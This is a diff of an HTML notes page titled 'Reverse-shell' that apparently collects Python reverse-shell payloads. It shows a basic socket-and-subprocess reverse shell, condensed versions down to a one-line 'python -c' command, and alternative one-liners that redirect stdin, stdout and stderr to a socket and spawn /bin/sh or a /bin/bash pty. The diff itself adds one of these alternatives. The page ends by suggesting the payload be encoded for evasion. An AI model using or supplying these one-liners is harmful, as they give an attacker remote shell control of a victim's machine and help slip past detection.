@@ -5,29 +5,32 @@
 <title>Reverse-shell</title>
 </head><body>Typical basic python reverse shell: <br/>
 <br/>
-<span style="font-size: 8pt"><span style="font-family: Courier New">import socket</span></span><br/>
-<span style="font-size: 8pt"><span style="font-family: Courier New">import subprocess </span></span><br/>
-<span style="font-size: 8pt"><span style="font-family: Courier New">s=socket.socket() </span></span><br/>
-<span style="font-size: 8pt"><span style="font-family: Courier New">s.connect(("127.0.0.1",9000)) </span></span><br/>
-<span style="font-size: 8pt"><span style="font-family: Courier New">while 1:</span></span><br/>
-&nbsp;<span style="font-size: 8pt"><span style="font-family: Courier New">p = subprocess.Popen(s.recv(1024), shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span></span><br/>
-&nbsp;<span style="font-size: 8pt"><span style="font-family: Courier New">s.send(p.stdout.read() + p.stderr.read())</span></span>&nbsp; <br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">import socket</span></span><br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">import subprocess </span></span><br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">s=socket.socket() </span></span><br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">s.connect(("127.0.0.1",9000)) </span></span><br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">while 1:</span></span><br/>
+&nbsp;<span style="font-family: Courier New"><span style="font-size: 8pt">p = subprocess.Popen(s.recv(1024), shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span></span><br/>
+&nbsp;<span style="font-family: Courier New"><span style="font-size: 8pt">s.send(p.stdout.read() + p.stderr.read())</span></span>&nbsp; <br/>
 <br/>
 <br/>
 Python relies on spacing to indicate the start and end of a code block. Chop it down to two lines:<br/>
 <br/>
-<span style="font-size: 8pt"><span style="font-family: Courier New">&gt;&gt;&gt; import socket;import subprocess ;s=socket.socket() ;s.connect(("127.0.0.1",9000)) </span></span><br/>
-<span style="font-size: 8pt"><span style="font-family: Courier New">&gt;&gt;&gt; while 1: p = subprocess.Popen(s.recv(1024), shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); s.send(p.stdout.read() + p.stderr.read())</span></span>&nbsp; <br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">&gt;&gt;&gt; import socket;import subprocess ;s=socket.socket() ;s.connect(("127.0.0.1",9000)) </span></span><br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">&gt;&gt;&gt; while 1: p = subprocess.Popen(s.recv(1024), shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); s.send(p.stdout.read() + p.stderr.read())</span></span>&nbsp; <br/>
 <br/>
 <br/>
 <a href="http://securityweekly.com/2011/10/23/python-one-line-shell-code/
  ">Down to one line</a>: <br/>
-python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect((‘127.0.0.1’,9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"<br/>
+<span style="font-size: 8pt">python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect((‘127.0.0.1’,9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span><br/>
 <br/>
 <br/>
-<span style="font-size: 6pt">Potential alternative:<br/>
+<span style="font-size: 10pt">Potential alternative:<br/>
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;LIP&gt;",&lt;LPORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br/>
 <br/>
+Potential alternative:<br/>
+</span>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'<span style="font-size: 6pt"><br/>
+</span><span style="font-size: 6pt"><br/>
 <br/>
 </span>Encode the payload for potential evasion<br/>
 <br/>
